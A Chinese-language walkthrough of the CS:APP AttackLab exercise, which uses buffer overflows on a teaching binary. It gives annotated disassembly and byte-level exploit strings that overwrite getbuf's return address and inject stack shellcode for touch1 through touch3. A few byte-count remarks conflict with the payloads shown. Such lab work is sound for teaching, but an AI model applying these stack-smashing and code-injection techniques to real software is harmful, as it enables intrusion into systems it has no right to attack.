# AttackLab
## phase_1 touch1
> 题目：Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test.
```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
- 通过查看getbuf代码得到，分配到的栈帧为40字节，因此输入的字符长度超过40字节后，产生栈溢出攻击，函数返回后的跳转地址在该栈帧起始位置的高40位中
- 因此，我们需要产生一个40字节无效字符串+**4字节目标跳转地址**，来将原来的函数返回地址**覆盖**
	- 查看`touch1`：![](https://jiunian-pic-1310185536.cos.ap-nanjing.myqcloud.com/picgo%2F20230107210652.png)
	```assembly
	00000000004017c0 <touch1>:
	  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
	  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
	  4017cb:	00 00 00 
	  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
	  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
	  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
	  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
	  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
	  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
	```
	- 函数`touch1`的起始位置位于内存`0x4017c0`，因此使用该地址将原函数返回地址覆盖，使`getbuf`函数返回时跳转至函数`touch1`执行
- 答案：
```
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
c0 17 40 00 00 00 00 00
```
> 由于机器使用**小端法**，在输入返回地址时，需要在输入每一个字节时，反过来输入

## phase_2 touch2
> 题目：our task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.

- `touch2`：![](https://jiunian-pic-1310185536.cos.ap-nanjing.myqcloud.com/picgo%2F20230107210804.png)
	- 可以看到，我们需要将cookie作为参数传入到touch2中，才可以实现攻击
	- 同上一题，先查看`touch2`函数在内存中的位置：`00000000004017ec `
- 如何传入参数？
	- 默认情况下，函数的参数依次放在寄存器`%rdi,%rsi,%rdx...`中，那么接下来思考的问题是：如何通过传入一个字符串来将参数放置在`%rdi`上，并且下一步执行`touch2`。
	- 通过输入字符串，我们可以在原来的栈帧上插入一段代码（使用机器码表示的代码），这个代码执行的功能是：
		 - 将目标参数(`cookie`)放置在寄存器`%rdi`上(`movq <cookie>, %rdi`)
		 - 跳转至`touch2`(`pushq <target_address>, retq`)
	- 如何跳转至植入的代码？
		- 获得我们输入字符串（植入代码）的栈帧的地址（即`getbuf`函数栈帧的首地址）
	- 然后就可以通过植入代码中的`retq`来跳转到刚刚入栈的地址(`touch2`)
> `getbuf`的栈帧首地址需要通过gdb调试获得
> 在`getbuf`函数处打一个断点，`run -q`，`info registers`来查找寄存器`%rsp`上的值（即当前栈帧的首地址，为`0x5561dc78`）

- 答案：
```
48 c7 c7 fa 97 b9 59      //movq
68 ec 17 40 00            //pushq
c3                        //retq
11                        //补齐40字节无效字符
11 11 11
11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
78 dc 61 55 00 00 00 00   //植入代码的地址
```

## phase_3 touch3
> 题目：Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

- 思路与上一题相似，但是要注意的是，我们这次传入的参数为一个**字符串**，因此我们需要将目标字符串的首地址放在第一个参数`%rdi`上，以此达到传入一个字符串参数的目的（字符串的本质是字符数组）
- 问题在于，我们需要将字符串放在那个位置
	- 由本题的建议：When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie
	- 可以知道，当调用函数`hexmatch`和`strncmp`时，原函数`getbuf`的栈帧会被覆盖，所以当我们成功跳转至`touch3`并调用`hexmatch`进行比较时，如果我们将cookie字符串放在`getbuf`栈帧上，该字符串将会被覆盖，导致无法获得该字符串，导致失败
	- 那么问题变为，找到一个不会被覆盖的位置（在进入getbuf函数前的栈顶，也即返回地址的前一个8字节，即`0x5561dca8`，并且这个地址可以方便的进行覆盖），并将字符串放在该地址上。
- 答案：
```
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
11
11 11 11
11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

